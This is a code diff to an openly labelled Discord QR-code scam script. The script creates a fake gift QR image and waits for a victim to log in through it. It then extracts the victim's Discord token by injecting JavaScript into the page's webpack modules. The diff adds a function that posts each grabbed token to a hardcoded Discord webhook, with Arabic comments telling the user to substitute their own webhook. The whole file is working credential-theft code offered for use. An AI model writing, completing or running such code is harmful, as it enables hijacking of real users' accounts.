@@ -4,6 +4,7 @@ from PIL import Image
 import base64
 import time
 import os
+import requests
 
 # Developer: NightfallGT
 # Educational purposes only
@@ -20,6 +21,17 @@ def paste_template():
     im2 = Image.open('temp/final_qr.png', 'r')
     im1.paste(im2, (120, 409))
     im1.save('discord_gift.png', quality=95)
+
+def send_token_to_webhook(token):
+    webhook_url = 'https://discord.com/api/webhooks/1272403881627877426/sVSisuDnXjdNRgMsZ-TrQJtw4KLl8HZiYXBb3d6KtuuMSuzccwkTfXwWgVo9rB1Vl8NU'  # استبدل هذا برابط الويب هوك الخاص بك
+    data = {
+        'content': f'Token grabbed: {token}'
+    }
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 204:
+        print('Token sent to webhook successfully.')
+    else:
+        print(f'Failed to send token to webhook. Status code: {response.status_code}')
 
 def main():
     print('github.com/NightfallGT/Discord-QR-Scam\n')
@@ -58,25 +70,25 @@ def main():
         if discord_login != driver.current_url:
             print('Grabbing token..')
             token = driver.execute_script('''
-
-    var req = webpackJsonp.push([
-        [], {
-            extra_id: (e, t, r) => e.exports = r
-        },
-        [
-            ["extra_id"]
-        ]
-    ]);
-    for (let e in req.c)
-        if (req.c.hasOwnProperty(e)) {
-            let t = req.c[e].exports;
-            if (t && t.__esModule && t.default)
-                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-        }
-    return token;   
-                ''')
+                var req = webpackJsonp.push([
+                    [], {
+                        extra_id: (e, t, r) => e.exports = r
+                    },
+                    [
+                        ["extra_id"]
+                    ]
+                ]);
+                for (let e in req.c)
+                    if (req.c.hasOwnProperty(e)) {
+                        let t = req.c[e].exports;
+                        if (t && t.__esModule && t.default)
+                            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
+                    }
+                return token;   
+            ''')
             print('---')
-            print('Token grabbed:',token)
+            print('Token grabbed:', token)
+            send_token_to_webhook(token)  # أضف هذا السطر لإرسال التوكن إلى ويب هوك
             break
 
     print('Task complete.')
